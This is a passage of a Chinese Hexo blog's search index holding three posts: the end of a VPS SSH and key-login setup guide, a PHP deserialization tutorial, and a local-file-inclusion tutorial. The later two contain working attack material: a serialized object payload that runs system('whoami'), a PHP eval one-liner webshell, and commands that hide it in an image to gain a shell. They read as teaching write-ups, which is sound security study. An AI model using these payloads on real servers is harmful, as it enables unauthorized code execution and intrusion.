class="language-bash"><span class="token function">netstat</span> -ntl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用修改后的端口连接ssh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -p <span class="token number">2233</span> root@127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果无误，将前面的Port 22注释掉</p><h4 id="配置免密登录"><a href="#配置免密登录" class="headerlink" title="配置免密登录"></a>配置免密登录</h4><h5 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/06/rKNmMd3SO1iITXb.png"></p><p>按提示输入即可（也可一直回车使用空密码）</p><p>公钥文件存储在C:\Users\15627.ssh\id_rsa.pub</p><h5 id="将密钥上传至服务器"><a href="#将密钥上传至服务器" class="headerlink" title="将密钥上传至服务器"></a>将密钥上传至服务器</h5><p>Linux下可直接使用ssh-copy-id</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">语法ssh-copy-id <span class="token punctuation">[</span>-i <span class="token punctuation">[</span>identity_file<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>user@<span class="token punctuation">]</span>machine例子ssh-copy-id -i ~/.ssh/id_rsa.pub root@127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/06/TSQKWMfOhbw9Fn5.png"></p><p>Windows下目前没有自带ssh-copy-id，可使用scp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">语法<span class="token function">scp</span> <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token punctuation">[</span>原路径<span class="token punctuation">]</span> <span class="token punctuation">[</span>目标路径<span class="token punctuation">]</span>例子<span class="token function">scp</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>usernmae<span class="token punctuation">\</span>.ssh<span class="token punctuation">\</span>id_rsa.pub root@127.0.0.1:~/.ssh/win.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/06/LtNS9aPdEY7B3vs.png"></p><p>然后使用ssh连接服务器将win.pub添加至authorized_keys</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /root/.ssh <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> win.pub <span class="token operator">>></span> authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可免密登录vps</p><h5 id="配置第三方软件免密登录"><a href="#配置第三方软件免密登录" class="headerlink" title="配置第三方软件免密登录"></a>配置第三方软件免密登录</h5><p><a href="https://www.netsarang.com/zh/xshell/">Xshell</a></p><p>菜单栏→工具→用户密钥管理者</p><p><img src="https://i.loli.net/2020/03/06/yAWoQBiHdCfUpF7.png"></p><p>在用户密钥处导入id_rsa</p><p><img src="https://i.loli.net/2020/03/06/IupVstZ5hENKW8R.png"></p><p>在用户身份验证中，方法选择Public Key，密钥选择刚导入的id_rsa即可</p><p><img src="https://i.loli.net/2020/03/06/YWtmJD1qTL6zNid.png"></p><p><a href="https://termius.com/">Termius</a></p><p>菜单栏→Keychain</p><p><img src="https://i.loli.net/2020/03/06/CtAB6rNzFJdgMD5.png"></p><p>在Keychain里选择NEW KEY，在Add Key的Label*处取个名，在Private Key*点击File导入id_rsa并保存</p><p><img src="https://i.loli.net/2020/03/06/kwb2YNRlATGWexU.png"></p><p>在连接设置里选择刚导入的key即可</p><p><img src="https://i.loli.net/2020/03/06/qcxwvZa4dhIWpso.png"></p><h4 id="安装V2ray"><a href="#安装V2ray" class="headerlink" title="安装V2ray"></a>安装V2ray</h4><p>具体参考</p><p><a href="https://github.com/233boy/v2ray/wiki/V2Ray%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC">V2Ray一键安装脚本</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的PHP反序列化</title>
      <link href="/archives/f8e3d21b/"/>
      <url>/archives/f8e3d21b/</url>
      
        <content type="html"><![CDATA[<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$xcx</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$miku</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">xcx</span><span class="token punctuation">;</span>       <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">miku</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'qq'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码上的 function __destruct是析构函数，会在 销毁一个类之前执行的一些操作或完成一些功能 。</p><p>因上面将xcx赋值给a，再将miku放进a执行，可以根据这个构造出命令执行的序列化</p><h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$xcx</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$miku</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">xcx</span><span class="token punctuation">;</span>       <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">miku</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将输出的值以POST形式传参，会返回whoami的结果</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LFI本地文件包含</title>
      <link href="/archives/2eda3969/"/>
      <url>/archives/2eda3969/</url>
      
        <content type="html"><![CDATA[<p><strong>LFI(Local File Inclusion)</strong><br>本地文件包含漏洞，指的是服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，利用这个特性，配合文件上传就可以getshell。</p><p>已知服务器存在文件包含且存在上传点</p><p><img src="https://i.loli.net/2019/10/28/PEFt7A4zhejvCrT.png"></p><p>只能上传图片，可制作图片一句话木马进行上传</p><p>在Windows可以通过cmd制作一句话木马。</p><p>命令为</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">copy 1.jpg&#x2F;b+2.php&#x2F;a 3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数/b指定以二进制格式复制、合并文件。用于图像类/声音类文件</p><p>参数/a指定以ASCII格式复制、合并文件。用于txt等文档类文件</p><p>这条命令就是把j1.pg和2.php合并到一起，生成3.jpg</p><p>Linux/Macos下通过终端制作</p><p>命令为 </p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">cat 1.php &gt;&gt; 2.jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这句命令是将1.php追加到2.jpg里面</p><p>如果是两个文件合并生成第三个</p><p>命令为 </p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">cat 1.php 2.jpg &gt;&gt; 3.jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PHP一句话 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xcx'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/nbHKW8wAzc5efCg.png"></p><p>上传图片马</p><p><img src="https://i.loli.net/2019/10/28/OSp7EcsZQwvIG9V.png"></p><p>利用文件包含</p><p><img src="https://i.loli.net/2019/10/28/AsC3XSg48rGfWTF.png"></p><p>可看到图片被解析成了PHP（因为被解析了所以不会显示一句话木马）</p><p>使用蚁剑连接</p><p><img src="https://i.loli.net/2019/10/28/i9QhcJI3vAtoEsg.png"></p><p>成功getshell</p><p><img src="https://i.loli.net/2019/10/28/bdesIZP6pYgEzaG.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
